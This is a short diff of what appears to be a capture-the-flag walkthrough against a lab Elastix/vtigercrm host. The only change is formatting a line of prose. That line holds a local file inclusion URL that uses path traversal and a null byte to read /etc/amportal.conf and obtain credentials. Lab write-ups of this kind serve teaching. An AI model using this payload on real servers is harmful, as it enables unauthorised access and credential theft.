@@ -174,9 +174,7 @@ print "\n[-] not successful\n";
 	}
 ``` 
 Essentially, the exploit works on the fact that there is an LFI in the *vtigercrm/graph.php* directory. And this directory is accessible because of its incapability to filter its user input.
-So visiting 
-https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
-should allow us to read credentials. AMPortal credentials according to the exploit. 
+So visiting **https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action**, should allow us to read credentials. AMPortal credentials according to the exploit. 
 
 The output is very messy and hard to read so we can open the page source in another tab instead. 
 Here is the result: 
